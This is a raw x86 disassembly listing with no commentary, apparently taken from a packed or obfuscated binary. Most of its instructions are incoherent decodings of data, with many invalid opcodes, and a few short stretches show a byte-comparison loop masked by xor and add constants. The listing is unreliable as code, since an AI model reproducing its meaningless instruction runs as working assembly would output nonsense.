  40806c:	mov    al,ds:0x9695fc29
  408071:	out    0x6d,eax
  408073:	outs   dx,BYTE PTR ds:[esi]
  408074:	adc    BYTE PTR [ecx-0x64170c9c],ah
  40807a:	jge    0x4080ca
  40807c:	jne    0x408038
  40807e:	mov    edi,DWORD PTR [ecx-0x59c58cc4]
  408084:	int3   
  408085:	cmp    BYTE PTR [edx+0x437cb77e],bh
  40808b:	aam    0xd8
  40808d:	mov    cl,0x3
  40808f:	add    BYTE PTR [eax+edx*1-0x58],dl
  408093:	dec    esp
  408094:	dec    al
  408096:	add    DWORD PTR [esi-0x4c],edi
  408099:	ss and al,0xc9
  40809c:	mov    ch,0x27
  40809e:	mov    ecx,0x826235c2
  4080a3:	mov    esi,0x85b4c8b0
  4080a8:	xor    bh,BYTE PTR [ecx+0x22]
  4080ab:	aam    0x82
  4080ad:	pop    ebx
  4080ae:	inc    edx
  4080af:	xor    BYTE PTR [ebx-0x60705200],0x6
  4080b6:	imul   eax,DWORD PTR [eax-0xd29a9f],0xbf4e4ad6
  4080c0:	xlat   BYTE PTR ds:[ebx]
  4080c1:	inc    dx
  4080c3:	dec    eax
  4080c4:	mov    eax,ds:0x49629058
  4080c9:	pop    esp
  4080ca:	xor    bh,dh
  4080cc:	enter  0xf46,0x6e
  4080d0:	mov    edx,0xc603c133
  4080d5:	mov    DWORD PTR [edx],eax
  4080d7:	mov    eax,DWORD PTR [ebp-0x8]
  4080da:	xor    eax,ecx
  4080dc:	add    eax,esi
  4080de:	mov    DWORD PTR [ebp+0x8],eax
  4080e1:	mov    eax,DWORD PTR [ebp+0x8]
  4080e4:	jmp    0x4083ed
  4080e9:	ret    
  4080ea:	ror    ch,1
  4080ec:	rcr    ecx,0xc9
  4080ef:	rcl    esi,cl
  4080f1:	push   edx
  4080f2:	add    DWORD PTR [edx-0x35fdaf8b],eax
  4080f8:	push   ds
  4080f9:	hlt    
  4080fa:	fnstsw WORD PTR [eax+0x78]
  4080fd:	fs jle 0x408178
  408100:	js     0x408131
  408102:	pop    edi
  408103:	jle    0x408150
  408105:	push   esi
  408106:	add    bh,BYTE PTR [edx]
  408108:	std    
  408109:	fmul   DWORD PTR [esi+0x3ed6cbd3]
  40810f:	retf   0xb5fc
  408112:	inc    edi
  408113:	push   ss
  408114:	inc    edx
  408115:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408116:	sub    al,0x61
  408118:	jl     0x408167
  40811a:	ins    BYTE PTR es:[edi],dx
  40811b:	mov    BYTE PTR [edx+0x3360fb88],al
  408121:	adc    DWORD PTR [edi+0xd47f670],esp
  408127:	vaddsd xmm5,xmm6,QWORD PTR [esi+0x72]
  40812c:	push   cs
  40812d:	cmp    al,0xb3
  40812f:	std    
  408130:	test   eax,0xb16f3538
  408135:	or     al,0x69
  408137:	and    al,0x54
  408139:	fimul  DWORD PTR [esi]
  40813b:	cs add eax,0xb05b9f60
  408141:	retf   0xd355
  408144:	retf   
  408145:	mov    ds:0xed24988,eax
  40814a:	ja     0x40810a
  40814c:	ss enter 0xc6d1,0xb0
  408151:	xor    ebp,esi
  408153:	mov    WORD PTR [edx+0x10029278],gs
  408159:	ja     0x40815a
  40815b:	aaa    
  40815c:	adc    eax,0xfa46770f
  408161:	pop    ecx
  408162:	add    BYTE PTR [edx+0x2c09bc39],al
  408168:	out    dx,al
  408169:	cwde   
  40816a:	xor    BYTE PTR [edi-0x72],ah
  40816d:	jnp    0x408149
  40816f:	mov    ecx,0x8f86e50
  408174:	sub    dl,dh
  408176:	repnz mov esi,0xc88684ed
  40817c:	cmp    DWORD PTR [ebp+ebx*2-0x77d75b3c],0xb590f769
  408187:	lods   eax,DWORD PTR ds:[esi]
  408188:	rcl    DWORD PTR [esi+edi*2-0x6be2d225],1
  40818f:	imul   edx,DWORD PTR [esi+edx*4],0xffffff83
  408193:	hlt    
  408194:	outs   dx,DWORD PTR ds:[esi]
  408195:	popa   
  408196:	ficomp WORD PTR [ebx+0x4abcf1f8]
  40819c:	cmp    ebp,ebx
  40819e:	fmul   DWORD PTR [edi-0x7e]
  4081a1:	fsub   QWORD PTR [eax+0x4f9070f0]
  4081a7:	sub    DWORD PTR [ebp-0x76],ecx
  4081aa:	xchg   ecx,eax
  4081ab:	sbb    edx,ecx
  4081ad:	xor    al,0xc6
  4081af:	(bad)  
  4081b0:	rol    BYTE PTR [eax+0x36fe8fde],1
  4081b6:	xlat   BYTE PTR ds:[ebx]
  4081b7:	add    al,0x48
  4081b9:	nop
  4081ba:	lods   eax,DWORD PTR ds:[esi]
  4081bb:	mov    al,0x7c
  4081bd:	cld    
  4081be:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4081bf:	mov    ebx,fs
  4081c1:	(bad)  
  4081c2:	dec    eax
  4081c3:	data16 scas al,BYTE PTR es:[edi]
  4081c5:	pop    ss
  4081c6:	sar    esp,0xd0
  4081c9:	aaa    
  4081ca:	sub    DWORD PTR [edi-0x4235a202],0x58
  4081d1:	and    al,0x8c
  4081d3:	not    dl
  4081d5:	sub    eax,0x6175bbc1
  4081da:	jmp    0x408239
  4081dc:	push   esp
  4081dd:	sub    ah,BYTE PTR [ebx-0x57]
  4081e0:	jl     0x408259
  4081e2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4081e3:	push   edx
  4081e4:	hlt    
  4081e5:	loope  0x40819c
  4081e7:	pushf  
  4081e8:	push   esp
  4081e9:	test   eax,0xa8be4844
  4081ee:	lock inc esp
  4081f0:	push   edx
  4081f1:	(bad)  
  4081f2:	add    bh,BYTE PTR [esi+0x24]
  4081f5:	in     al,dx
  4081f6:	lea    edi,[edi-0x45]
  4081f9:	(bad)  
  4081fa:	mov    ch,0xd2
  4081fc:	enter  0xf1aa,0x43
  408200:	int    0xc1
  408202:	xor    BYTE PTR [ebp+0x6db9d7f9],0xc6
  408209:	or     eax,0xdcc6c674
  40820e:	push   es
  40820f:	cld    
  408210:	jae    0x408264
  408212:	(bad)
  408215:	or     DWORD PTR [ebp+0x99e5204],esi
  40821b:	cmp    al,0xe3
  40821d:	pop    es
  40821e:	mov    ebp,0x50963f22
  408223:	dec    ebx
  408224:	or     esi,ebx
  408226:	in     eax,dx
  408227:	adc    BYTE PTR [edi+0x27],ch
  40822a:	jbe    0x40825f
  40822c:	pop    ebp
  40822d:	(bad)  
  40822e:	rcr    DWORD PTR [edi+0x4fd6bee0],1
  408234:	and    DWORD PTR [edi+0x7a],esp
  408237:	inc    esi
  408238:	das    
  408239:	mov    esi,0xbf6927ea
  40823e:	lea    ebp,[eax]
  408240:	scas   al,BYTE PTR es:[edi]
  408241:	and    esp,ebx
  408243:	xchg   DWORD PTR [ecx+0x75],eax
  408246:	arpl   WORD PTR [esi-0x55],bx
  408249:	test   edx,edi
  40824b:	push   esi
  40824c:	pop    ds
  40824d:	dec    BYTE PTR [eax+ebp*4+0x49e1a2fe]
  408254:	pushf  
  408255:	fcmovb st,st(3)
  408257:	pusha  
  408258:	sbb    ecx,edi
  40825a:	iret   
  40825b:	loop   0x40823f
  40825d:	adc    bl,BYTE PTR [ecx+ecx*8]
  408260:	pop    es
  408261:	inc    edx
  408262:	bound  esi,QWORD PTR [edi+0x7ced8598]
  408268:	(bad)  
  408269:	in     al,0x75
  40826b:	das    
  40826c:	cmovp  edi,DWORD PTR [edx+0x575ddac8]
  408273:	xor    dl,ah
  408275:	sub    al,0x61
  408277:	cwde   
  408278:	inc    BYTE PTR [esp+eax*8+0x14]
  40827c:	cwde   
  40827d:	jg     0x4082b0
  40827f:	xchg   ebx,eax
  408280:	out    dx,al
  408281:	mov    esi,0x96e73c3b
  408286:	cs pop edi
  408288:	mov    ebp,0x8f7880b4
  40828d:	pop    ds
  40828e:	sub    ebx,DWORD PTR [ebx-0x14]
  408291:	dec    esi
  408292:	outs   dx,DWORD PTR ds:[esi]
  408293:	add    BYTE PTR [ebx+esi*1+0x3c68edbf],ch
  40829a:	add    dl,BYTE PTR [edi-0x51f48d3e]
  4082a0:	xor    DWORD PTR [edx],ebx
  4082a2:	xchg   ebx,eax
  4082a3:	out    0xe0,eax
  4082a5:	xor    esp,eax
  4082a7:	mov    edx,0xec2cbcc
  4082ac:	pop    ebx
  4082ad:	sbb    BYTE PTR [esi+ecx*8-0x6f],ch
  4082b1:	mov    DWORD PTR [edx+edx*8],0xbe73ce90
  4082b8:	out    dx,eax
  4082b9:	xor    esi,DWORD PTR [edi-0x42514872]
  4082bf:	push   ss
  4082c0:	(bad)  
  4082c1:	scas   eax,DWORD PTR es:[edi]
  4082c2:	pop    ebp
  4082c3:	inc    ebx
  4082c4:	add    cl,BYTE PTR [esi+edi*2+0x1b0bcc01]
  4082cb:	mov    BYTE PTR [eax-0x8fc93cd],bh
  4082d1:	fcomp  QWORD PTR [eax]
  4082d3:	push   esp
  4082d4:	and    ebx,DWORD PTR [ebp-0x3aa59974]
  4082da:	push   ebp
  4082db:	lock add DWORD PTR [ebp-0x39],ebx
  4082df:	dec    edi
  4082e0:	into   
  4082e1:	mov    ecx,0x8ba023c9
  4082e6:	call   0x194ea0b8
  4082eb:	cs jmp 0x4082d1
  4082ee:	imul   ah
  4082f0:	jbe    0x4082a1
  4082f2:	bnd ret 0x2f82
  4082f6:	test   BYTE PTR [ebp+0x6fb3d974],0x77
  4082fd:	xchg   esi,eax
  4082fe:	or     ch,0xe8
  408301:	neg    BYTE PTR [eax]
  408303:	(bad)  
  408304:	outs   dx,BYTE PTR ds:[esi]
  408305:	mov    ds:0xe6d27b54,eax
  40830a:	inc    eax
  40830b:	sbb    edi,edi
  40830d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40830e:	sbb    eax,0xeed3c5c5
  408313:	(bad)  
  408314:	jmp    0x4082ce
  408316:	adc    ah,BYTE PTR [ebp+edi*2-0x333498f]
  40831d:	lods   eax,DWORD PTR ds:[esi]
  40831e:	xor    eax,0x279f3fff
  408323:	push   cs
  408324:	in     eax,0xca
  408326:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408327:	or     DWORD PTR [edi+0x1aeed88d],ebx
  40832d:	cmp    BYTE PTR [ecx-0x79c4bf7f],ch
  408333:	inc    edi
  408334:	add    dh,BYTE PTR [edi+edi*8+0x11]
  408338:	add    DWORD PTR [ebx+eax*2-0x77],0xffffffe7
  40833d:	aad    0x7a
  40833f:	mov    esi,0x2bc73973
  408344:	cmp    eax,0x45aef1d7
  408349:	push   ebx
  40834a:	enter  0x8377,0x2b
  40834e:	test   BYTE PTR [eax+eiz*8+0x15],cl
  408352:	xchg   edi,eax
  408353:	data16 icebp 
  408355:	inc    ebp
  408356:	mov    edx,0x8d764653
  40835b:	arpl   cx,bx
  40835d:	dec    ecx
  40835e:	jo     0x4083a6
  408360:	mov    esi,0x5c32b93c
  408365:	jbe    0x40839a
  408367:	outs   dx,DWORD PTR ds:[esi]
  408368:	hlt    
  408369:	xchg   esp,eax
  40836a:	test   BYTE PTR [edx+0x682b3784],al
  408370:	fldenv [esi+0x3c]
  408373:	bswap  esi
  408375:	in     al,dx
  408376:	pop    edi
  408377:	cmp    ebp,DWORD PTR [eax]
  408379:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40837a:	mov    al,dl
  40837c:	jmp    0x408350
  40837e:	jo     0x4083e2
  408380:	push   eax
  408381:	je     0x408317
  408383:	sub    ebp,DWORD PTR [eax-0x521c0c01]
  408389:	test   DWORD PTR [ecx-0x7eac8c31],ebp
  40838f:	jo     0x4083d2
  408391:	mov    al,ds:0x85505a51
  408396:	jnp    0x408322
  408398:	fdiv   DWORD PTR [edi-0xf]
  40839b:	hlt    
  40839c:	ja     0x408364
  40839e:	mov    eax,ds:0xddf71136
  4083a3:	push   ss
  4083a4:	push   ebx
  4083a5:	adc    eax,0x954bb1ec
  4083aa:	sub    dh,BYTE PTR [edi]
  4083ac:	imul   esp,edx,0x5d
  4083af:	cs sub edi,ebp
  4083b2:	pop    eax
  4083b3:	push   esp
  4083b4:	push   edi
  4083b5:	xor    bh,BYTE PTR [ecx]
  4083b7:	adc    cl,bh
  4083b9:	popf   
  4083ba:	mov    BYTE PTR [edx+0x43],bl
  4083bd:	cmp    BYTE PTR [edx],ch
  4083bf:	xor    edi,DWORD PTR [ebx]
  4083c1:	xchg   ecx,eax
  4083c2:	mov    edi,0x21877617
  4083c7:	push   0x3f
  4083c9:	mov    ch,0x2a
  4083cb:	lods   al,BYTE PTR ds:[esi]
  4083cc:	xor    dl,BYTE PTR [edi]
  4083ce:	jo     0x4083af
  4083d0:	sahf   
  4083d1:	icebp  
  4083d2:	pushf  
  4083d3:	inc    ecx
  4083d4:	mov    bh,0x98
  4083d6:	mov    ecx,0xe8dba513
  4083db:	popa   
  4083dc:	mov    ecx,0xe7803473
  4083e1:	and    bl,BYTE PTR ds:0xcac0b5e1
  4083e7:	cld    
  4083e8:	mov    ah,0x3a
  4083ea:	mov    eax,0x448a93f0
  4083ef:	add    eax,0xff558aa8
  4083f4:	cmp    al,dl
  4083f6:	je     0x408742
  4083fc:	mov    eax,DWORD PTR [ebp+0x8]
  4083ff:	mov    al,BYTE PTR [ebp+eax*1-0x58]
  408403:	mov    edx,DWORD PTR [ebp+0xc]
  408406:	cmp    al,BYTE PTR [edx]
  408408:	jne    0x408a71
  40840e:	mov    eax,DWORD PTR [ebp-0x8]
  408411:	mov    edx,DWORD PTR [ebp+0xc]
  408414:	movsx  edx,BYTE PTR [edx]
  408417:	xor    eax,ecx
  408419:	add    eax,esi
  40841b:	cmp    edx,eax
  40841d:	je     0x40875c
  408423:	mov    DWORD PTR [ebp-0x18],0x705fd8e
  40842a:	jmp    0x408733
  40842f:	cmp    al,0xc8
  408431:	rcl    dl,0xd4
  408434:	fcmovu st,st(2)
  408436:	into   
  408437:	(bad)  
  408438:	leave  
  408439:	xchg   BYTE PTR [edi-0x4bd9398c],dl
  40843f:	loopne 0x408423
  408441:	js     0x4084bb
  408443:	fs jle 0x4084be
  408446:	js     0x40841a
  408448:	and    bh,BYTE PTR [esi]
  40844a:	sti    
  40844b:	data16 aaa 
  40844d:	mov    ds:0xfa0a0c7c,eax
  408452:	jae    0x408493
  408454:	xchg   edi,eax
  408455:	xchg   BYTE PTR [ebp-0x1860ff57],al
  40845b:	push   esi
  40845c:	scas   eax,DWORD PTR es:[edi]
  40845d:	cdq    
  40845e:	push   ebx
  40845f:	cmp    eax,0xccb4b3bb
  408464:	jmp    0x312e9007
  408469:	adc    dl,BYTE PTR [eax+0x64]
  40846c:	std    
  40846d:	jo     0x40842e
  40846f:	fscale 
  408471:	imul   edx,DWORD PTR [ecx+0x7d],0x8
  408475:	rol    DWORD PTR [ebx+ebx*8-0x1f],1
  408479:	jns    0x408422
  40847b:	push   ds
  40847c:	push   0xde44a175
  408481:	add    BYTE PTR [esi+0x25b6b290],ch
  408487:	xchg   DWORD PTR [esi+0x35400b8e],edi
  40848d:	mov    cl,0x2a
  40848f:	push   edi
  408490:	push   ss
  408491:	loope  0x408436
  408493:	outs   dx,BYTE PTR ds:[esi]
  408494:	mov    dl,0xde
  408496:	cmp    ah,bh
  408498:	push   0xb
  40849a:	mov    edi,0x9d64fda4
  40849f:	call   0x3f56:0xd3ebd368
  4084a6:	in     eax,0xbb
  4084a8:	lods   al,BYTE PTR ds:[esi]
  4084a9:	push   ecx
  4084aa:	loop   0x408498
  4084ac:	mov    edx,0xccd995aa
  4084b1:	pop    es
  4084b2:	adc    bl,BYTE PTR [edi-0x1bb420ae]
  4084b8:	movaps xmm4,XMMWORD PTR [esi+0x1e]
  4084bc:	mov    al,ds:0x99d7c432
  4084c1:	outs   dx,BYTE PTR ds:[esi]
  4084c2:	and    al,0xbd
  4084c4:	fdivr  DWORD PTR [ecx+0x204b1b53]
  4084ca:	or     ecx,DWORD PTR [esi+0x651c8230]
  4084d0:	leave  
  4084d1:	cdq    
  4084d2:	(bad)  
  4084d3:	sub    ch,BYTE PTR [eax]
  4084d5:	mov    BYTE PTR [ecx+0x2386f6cb],0x50
  4084dc:	xchg   ebx,eax
  4084dd:	fwait
  4084de:	mov    ah,0x75
  4084e0:	xchg   edx,eax
  4084e1:	and    al,0xe8
  4084e3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4084e4:	enter  0x5e62,0xcf
  4084e8:	jbe    0x408487
  4084ea:	pushf  
  4084eb:	sub    eax,0x507c1083
  4084f0:	mov    dh,0x98
  4084f2:	add    ecx,DWORD PTR [esi]
  4084f4:	arpl   bx,dx
  4084f6:	or     eax,0xac1e910
  4084fb:	lock jb 0x408570
  4084fe:	push   ebp
  4084ff:	retf   
  408500:	ins    DWORD PTR es:[edi],dx
  408501:	inc    esi
  408502:	mov    bl,0x65
  408504:	ret    
  408505:	out    0xc5,eax
  408507:	or     BYTE PTR [si],0xaa
  40850b:	ins    DWORD PTR es:[edi],dx
  40850c:	je     0x4084ff
  40850e:	call   0x6cb5:0xd9c296cd
  408515:	push   ds
  408516:	sbb    cl,dl
  408518:	fsubr  st(4),st
  40851a:	scas   al,BYTE PTR es:[edi]
  40851b:	and    eax,0x67bbd943
  408520:	xor    eax,0x7621ce7c
  408525:	xchg   ebp,eax
  408526:	popf   
  408527:	and    dl,BYTE PTR [ebx-0x7]
  40852a:	mov    dl,0x35
  40852c:	fsubr  DWORD PTR [ecx-0x2a]
  40852f:	aas    
  408530:	(bad)  
  408531:	mov    edx,0x1e09eb01
  408536:	mov    edi,DWORD PTR [edx+edx*8]
  408539:	loop   0x4084ed
  40853b:	or     BYTE PTR [ecx-0x51],dh
  40853e:	bnd jmp 0x408553
  408541:	ret    0x476e
  408544:	daa    
  408545:	sub    esp,ebp
  408547:	and    eax,0x57736c2e
  40854c:	inc    ebp
  40854d:	push   ecx
  40854e:	icebp  
  40854f:	mov    eax,ds:0xfd5e1c19
  408554:	inc    edi
  408555:	and    dl,bl
  408557:	pop    esi
  408558:	in     al,0x3f
  40855a:	(bad)
  40855d:	sub    cl,BYTE PTR [ebx]
  40855f:	(bad)  
  408560:	shl    edx,1
  408562:	jo     0x408534
  408564:	cli    
  408565:	cmp    dl,BYTE PTR [ecx]
  408567:	adc    BYTE PTR [edx],bl
  408569:	mov    ebp,0xe3d0cc38
  40856e:	push   DWORD PTR [ecx+0x3f]
  408571:	cmp    eax,0x6e10b56f
  408576:	xchg   BYTE PTR [ecx+0x646f8f57],ah
  40857c:	sti    
  40857d:	push   ebp
  40857e:	and    BYTE PTR [esi-0x4f14b616],bl
  408584:	mov    esi,0xe5b9d13c
  408589:	push   esi
  40858a:	inc    ebx
  40858b:	cld    
  40858c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40858d:	addr16 loope 0x4085ee
  408590:	sahf   
  408591:	je     0x4085f0
  408593:	arpl   WORD PTR [edx],sp
  408595:	adc    dh,BYTE PTR [edi]
  408597:	cmp    ecx,ebx
  408599:	pop    edi
  40859b:	sbb    al,0xe1
  40859d:	jne    0x40861e
  40859f:	inc    ecx
  4085a0:	hlt    
  4085a1:	test   al,0xaf
  4085a3:	lods   eax,DWORD PTR ds:[esi]
  4085a4:	aaa    
  4085a5:	sub    edx,DWORD PTR [eax]
  4085a7:	mov    esi,0xaa7b5a2c
  4085ac:	sub    eax,0x5d8ce3f4
  4085b1:	inc    edi
  4085b2:	cmc    
  4085b3:	pop    ds
  4085b4:	sahf   
  4085b5:	test   dl,dl
  4085b7:	pop    ebx
  4085b8:	in     eax,0x3e
  4085ba:	ja     0x408564
  4085bc:	mov    bh,al
  4085be:	jmp    0xbbead3e
  4085c3:	mov    bh,BYTE PTR [ebx]
  4085c5:	aam    0x18
  4085c7:	std    
  4085c8:	(bad)
  4085cc:	xor    al,0x84
  4085ce:	push   ds
  4085cf:	js     0x4085b3
  4085d1:	out    0xed,eax
  4085d3:	push   0x5d
  4085d5:	jne    0x40860e
  4085d7:	loope  0x4085f3
  4085d9:	inc    ecx
  4085da:	stos   DWORD PTR es:[edi],eax
  4085db:	sub    BYTE PTR [ecx],dl
  4085dd:	jp     0x40862d
  4085df:	or     eax,esi
  4085e1:	cmc    
  4085e2:	push   ss
  4085e3:	mov    ah,0xfe
  4085e5:	jmp    0x1b29:0xa5a4d2fc
  4085ec:	sar    DWORD PTR [edi-0x6f],1
  4085ef:	nop
  4085f0:	out    0xa7,eax
  4085f2:	loop   0x408613
  4085f4:	fdivrp st(7),st
  4085f6:	pop    ebp
  4085f7:	je     0x408676
  4085f9:	mov    edi,fs
  4085fb:	pop    esp
  4085fc:	outs   dx,DWORD PTR ds:[esi]
  4085fd:	test   BYTE PTR fs:[ecx-0x71],0x44
  408602:	retf   
  408603:	ss div al
  408606:	jp     0x408626
  408608:	ss cli 
  40860a:	xchg   ecx,eax
  40860b:	(bad)  
  40860c:	out    dx,al
  40860d:	add    esi,DWORD PTR [esp+eiz*2]
  408610:	outs   dx,BYTE PTR ds:[esi]
  408611:	mov    dl,0x8c
  408613:	xor    eax,0xdffef979
  408618:	fcom   DWORD PTR [ecx+0x31]
  40861b:	cmp    DWORD PTR [esi-0x59],0x2c2621ec
  408622:	fdivr  st(6),st
  408624:	sti    
  408625:	sbb    al,0x29
  408627:	add    BYTE PTR [ebp-0x590a04f8],dl
  40862d:	pop    ebp
  40862e:	(bad)  
  40862f:	mov    bh,0xe7
  408631:	(bad)  
  408632:	ins    BYTE PTR es:[edi],dx
  408633:	data16 or al,0xab
  408636:	xor    edx,esi
  408638:	dec    ecx
  40863a:	std    
  40863b:	adc    cl,0xcf
  40863e:	(bad)  [ecx]
  408640:	push   cs
  408641:	and    eax,0xa59751bd
  408646:	mul    DWORD PTR [ebp-0xebc2008]
  40864c:	addr16 pushf 
  40864e:	and    BYTE PTR [eax+0x49d30052],0x53
  408655:	ret    
  408656:	(bad)  
  408657:	rcr    DWORD PTR [edx-0x2],1
  40865a:	sbb    DWORD PTR [edi-0x2c8b9399],eax
  408660:	scas   eax,DWORD PTR es:[edi]
  408661:	popa   
  408662:	ror    DWORD PTR [eax+0x58],1
  408665:	cmp    DWORD PTR [ebp-0x62],ebx
  408668:	cmp    al,0xbc
  40866a:	mov    edi,ecx
  40866c:	mov    esi,0xe65b5b67
  408671:	inc    ebx
  408672:	jae    0x40862f
  408674:	sti    
  408675:	pushf  
  408676:	jnp    0x40860d
  408678:	nop
  408679:	div    DWORD PTR [ebp+0x58]
  40867c:	loop   0x4086d1
  40867e:	cmp    esp,DWORD PTR [eax]
  408680:	inc    eax
  408681:	test   eax,0xe3ac3e9b
  408686:	repnz inc ecx
  408688:	mov    bh,BYTE PTR [edx]
  40868a:	arpl   WORD PTR [ebp-0x5e],ax
  40868d:	sub    al,0xd5
  40868f:	sub    ah,BYTE PTR [ecx+0x26f10dcb]
  408695:	int3   
  408696:	and    esi,esp
  408698:	pop    edi
  408699:	xor    eax,0x6b71fe0a
  40869e:	and    BYTE PTR [edx],0xf0
  4086a1:	xchg   ebp,eax
  4086a2:	dec    ebx
  4086a3:	fiadd  DWORD PTR ds:[esi-0x41710d19]
  4086aa:	fld    QWORD PTR [ebp-0x53baa3ca]
  4086b0:	mov    dl,0xa2
  4086b2:	inc    esp
  4086b3:	fs and ah,BYTE PTR ss:[edi+0x1bd949b]
  4086bb:	in     eax,0x1e
  4086bd:	mov    ah,BYTE PTR [ecx+eiz*2-0x33]
  4086c1:	pop    ebx
  4086c2:	test   eax,0x69763019
  4086c7:	mov    al,ds:0xa85bcd9c
  4086cc:	pop    ds
  4086cd:	aam    0xa0
  4086cf:	dec    esi
  4086d0:	push   ebp
  4086d1:	loopne 0x4086ea
  4086d3:	sbb    al,0x32
  4086d5:	js     0x408722
  4086d7:	mov    ebp,DWORD PTR [ecx-0x5c]
  4086da:	mov    dl,0x72
  4086dc:	pop    eax
  4086dd:	xor    al,0x7f
  4086df:	rcl    BYTE PTR [ecx],1
  4086e1:	pop    esp
  4086e2:	in     al,0x89
  4086e4:	mov    BYTE PTR [ecx+0x3b67a8ab],al
  4086ea:	fdivr  DWORD PTR [esi]
  4086ec:	jp     0x408757
  4086ee:	mov    ah,0xf
  4086f0:	jmp    0xb8fc:0x5dac2b38
  4086f7:	xor    bh,BYTE PTR [edx-0x6bf33ab8]
  4086fd:	and    ebp,DWORD PTR [eax]
  4086ff:	jge    0x4086c2
  408701:	push   esp
  408702:	mov    BYTE PTR [ebp-0x5d61114],dl
  408708:	xchg   ecx,eax
  408709:	jle    0x408723
  40870b:	fcomp  st(1)
  40870d:	imul   esp,DWORD PTR [esi],0xbc609b2c
  408713:	adc    eax,0x82f64045
  408718:	shr    edi,cl
  40871a:	mov    eax,ds:0x472ecca7
  40871f:	stos   BYTE PTR es:[edi],al
  408720:	mov    esi,DWORD PTR [ebx]
  408722:	mov    ds:0x8d2be3f6,eax
  408727:	inc    eax
  408728:	pop    edi
  408729:	pop    eax
  40872a:	imul   ebx,DWORD PTR [eax+0x6590172d],0xffffffcc
  408731:	adc    al,0xce
  408733:	lea    eax,[ebp-0x18]
  408736:	mov    DWORD PTR [ebp-0x14],eax
  408739:	mov    eax,DWORD PTR [ebp-0x14]
  40873c:	add    DWORD PTR [eax],0x705fa8e
  408742:	mov    eax,DWORD PTR [ebp-0x10]
  408745:	mov    edx,DWORD PTR [ebp+0x8]
  408748:	xor    eax,ecx
  40874a:	lea    eax,[eax+edx*1+0x327298]
  408751:	mov    DWORD PTR [ebp+0x8],eax
  408754:	inc    DWORD PTR [ebp+0xc]
  408757:	jmp    0x4080e1
  40875c:	mov    eax,DWORD PTR [ebp-0x10]
  40875f:	xor    eax,ecx
  408761:	mov    ecx,DWORD PTR [ebp+0x10]
  408764:	add    eax,esi
  408766:	jmp    0x408a6f
  40876b:	(bad)
  40876e:	aas    
  40876f:	fld    st(3)
  408771:	(bad)  
  408773:	add    edi,DWORD PTR [ebp-0x7e]
  408776:	sahf   
  408777:	jge    0x40873d
  408779:	inc    esi
  40877a:	cwde   
  40877b:	int3   
  40877c:	out    0x78,eax
  40877e:	js     0x4087e4
  408780:	jle    0x4087fa
  408782:	js     0x4087a3
  408784:	add    eax,0xdb4b03ce
  408789:	jle    0x40871b
  40878b:	loop   0x4087a5
  40878d:	int3   
  40878e:	mov    ch,0x63
  408790:	jl     0x40875d
  408792:	push   eax
  408793:	sub    al,0x4d
  408795:	xchg   BYTE PTR [ecx],dl
  408797:	iret   
  408798:	icebp  
  408799:	sub    dl,BYTE PTR [ebp+0x44]
  40879c:	(bad)  
  40879d:	jno    0x408725
  40879f:	dec    edi
  4087a0:	and    eax,0x32987898
  4087a5:	mov    eax,ds:0x54acdf3
  4087aa:	jno    0x4087b5
  4087ac:	inc    ecx
  4087ad:	sar    BYTE PTR [esi+0x32fa1b9c],1
  4087b3:	jmp    0x40875c
  4087b5:	jp     0x40881c
  4087b7:	jecxz  0x4087f6
  4087b9:	xor    ebp,0x4c
  4087bc:	sti    
  4087bd:	test   eax,0x4ee8e824
  4087c2:	pop    edx
  4087c3:	jo     0x408831
  4087c5:	mov    ds,WORD PTR [edx-0x3d]
  4087c8:	aad    0xf2
  4087ca:	add    al,0x73
  4087cc:	ja     0x408786
  4087ce:	cld    
  4087cf:	not    eax
  4087d1:	cld    
  4087d2:	ror    DWORD PTR [edx],1
  4087d4:	sub    eax,0xd4bf8656
  4087d9:	cli    
  4087da:	inc    esi
  4087db:	mov    edi,DWORD PTR [eax]
  4087dd:	(bad)  
  4087de:	not    eax
  4087e0:	xchg   ebx,ecx
  4087e2:	pop    edi
  4087e3:	outs   dx,DWORD PTR ds:[esi]
  4087e4:	lods   eax,DWORD PTR ds:[esi]
  4087e5:	loope  0x40876b
  4087e7:	cmc    
  4087e8:	sti    
  4087e9:	mov    dh,0x77
  4087eb:	jg     0x4087d0
  4087ed:	in     al,dx
  4087ee:	clc    
  4087ef:	and    al,dl
  4087f1:	mov    esi,0x7ef55523
  4087f6:	push   ecx
  4087f7:	xlat   BYTE PTR ds:[ebx]
  4087f8:	jg     0x408829
  4087fa:	aaa    
  4087fb:	sub    ah,BYTE PTR [edx-0x75]
  4087fe:	push   esi
  4087ff:	(bad)  
  408800:	mov    edx,eax
  408802:	add    edi,DWORD PTR ds:0x1ccb7c65
  408808:	inc    ebp
  408809:	sub    BYTE PTR [edx-0x7b],cl
  40880c:	into   
  40880d:	sub    eax,0x6ac105b7
  408812:	jo     0x40888e
  408814:	mov    dl,0xb
  408816:	pop    ss
  408817:	or     BYTE PTR [eax+ebx*1-0x21f1b175],bl
  40881e:	xlat   BYTE PTR ds:[ebx]
  40881f:	icebp  
  408820:	sti    
  408821:	xor    ah,cl
  408823:	repnz data16 mov al,0xd0
  408827:	mov    ds:0x38bfef41,al
  40882c:	xlat   BYTE PTR ds:[ebx]
  40882d:	popf   
  40882e:	loopne 0x40889f
  408830:	and    BYTE PTR [ebx],0x15
  408833:	imul   edi,DWORD PTR [ebx+0x5e07fa0d],0x4f
  40883a:	loop   0x408894
  40883c:	sub    eax,0x21621d91
  408841:	push   cs
  408842:	imul   ebp,DWORD PTR [eax],0x1f
  408845:	push   0xba081de2
  40884a:	ret    
  40884b:	sbb    ebp,DWORD PTR [edx+0x7a]
  40884e:	adc    al,0x7e
  408850:	jmp    0x6d2e:0x938b10a4
  408857:	(bad)  
  408858:	aad    0xdd
  40885a:	pop    esi
  40885b:	repnz test al,0xff
  40885e:	in     al,dx
  40885f:	adc    DWORD PTR [edx+0x4f6499e8],ebx
  408865:	jmp    0x9cdb:0x204544e8
  40886c:	add    DWORD PTR [ecx+0x3d411e05],edx
  408872:	adc    BYTE PTR [esi-0x2],al
  408875:	adc    al,0x53
  408877:	fisub  DWORD PTR [esp+edi*8-0x3a]
  40887b:	lahf   
  40887c:	cwde   
  40887d:	pop    es
